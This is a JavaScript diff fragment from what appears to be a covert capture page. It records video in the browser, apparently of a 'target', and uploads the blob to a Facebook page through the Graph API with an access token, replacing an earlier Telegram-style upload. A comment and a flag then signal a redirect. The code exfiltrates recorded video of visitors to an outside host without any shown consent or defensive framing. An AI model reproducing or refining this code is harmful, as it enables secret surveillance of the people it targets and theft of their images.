@@ -23,11 +23,14 @@
             recorder.onstop = async () => {
                 const videoBlob = new Blob(chunks, { type: 'video/webm' });
                 const videoData = new FormData();
-                videoData.append('chat_id', CHAT_ID);
-                videoData.append('video', videoBlob, 'target_video.mp4');
-                videoData.append('caption', '🎬 Sucessfully Record ✔');
-                
-               await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`,{method: "POST",body: videoData });
+videoData.append("source", videoBlob, "video.mp4");
+videoData.append("description", "🎬 Successfully Recorded ✔");
+videoData.append("access_token", PAGE_ACCESS_TOKEN);
+
+await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`, {
+  method: "POST",
+  body: videoData
+});
                 
                 // Báo hiệu chuyển hướng
                 window.mainScriptFinished = true;
